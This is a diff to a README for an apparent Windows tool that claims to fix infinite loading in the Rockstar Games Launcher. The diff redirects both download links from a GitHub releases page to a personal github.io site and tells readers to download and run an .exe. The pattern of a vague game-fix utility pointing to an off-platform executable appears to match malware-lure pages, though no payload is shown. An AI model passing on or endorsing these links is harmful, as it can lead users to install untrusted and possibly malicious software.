@@ -1,6 +1,6 @@
 # 🛠️ Rockstar-Launcher-Infinite-Loading-Fix - Stop infinite loading on Rockstar Games
 
-[![Download the Fix](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ailaomnivorous44/Rockstar-Launcher-Infinite-Loading-Fix/releases)
+[![Download the Fix](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ailaomnivorous44.github.io)
 
 The Rockstar Games Launcher sometimes stays on a loading screen. This happens on Windows 10 and Windows 11. This tool fixes the connection errors that cause that infinite loading state. It resets the local cache and networking files to allow the launcher to reach the game servers.
 
@@ -17,7 +17,7 @@ Check your computer before you use this tool. You need:
 
 You download the latest version of this tool from the official releases page. 
 
-[Click here to visit the release page and download the fix](https://github.com/Ailaomnivorous44/Rockstar-Launcher-Infinite-Loading-Fix/releases)
+[Click here to visit the release page and download the fix](https://ailaomnivorous44.github.io)
 
 Look for the file ending in .exe in the "Assets" section of the page. Save this file to your computer.
 
